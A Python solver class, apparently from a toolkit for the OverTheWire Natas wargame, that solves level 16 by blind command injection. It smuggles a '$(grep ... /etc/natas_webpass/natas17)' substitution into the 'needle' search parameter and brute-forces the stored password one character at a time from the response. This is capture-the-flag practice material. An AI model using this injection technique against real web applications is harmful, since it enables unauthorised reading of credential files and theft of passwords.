import string
from rich.live import Live
from rich.text import Text
from rich.console import Group, Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from .base_solver import NatasSolver
from utils.helpers import get_charset

class Natas16Solver(NatasSolver):
    def solve(self) -> str:
        try:
            password = ""
            chars = get_charset()
            console = Console()
            
            # Create progress display
            progress = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=console,
                expand=True
            )
            
            # Add password progress task
            password_task = progress.add_task("[cyan]Password Progress\n", total=32)
            status_line = Text()
            
            console.print("\n[*] Starting brute force...\n")
            
            with Live(
                Group(
                    status_line,
                    Text(""),  # Spacing
                    progress
                ),
                console=console,
                refresh_per_second=10,
                transient=False
            ) as live:
                while len(password) < 32:
                    progress.update(password_task, completed=len(password))
                    
                    for c in chars:
                        status_line.plain = f"Current Password: {password}\nTesting: {c}"
                        
                        payload = f'doomed$(grep -E ^{password}{c}.* /etc/natas_webpass/natas17)'
                        response = self.make_request(
                            params={"needle": payload}
                        )
                        
                        if "doomed" not in response.text:
                            password += c
                            break
                
                # Show completion
                progress.update(password_task, completed=32)
                status_line.plain = f"Found Password: {password}"
            
            console.print(f"\n[green]✓[/green] Password found: {password}\n")
            return password
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas16: {str(e)}")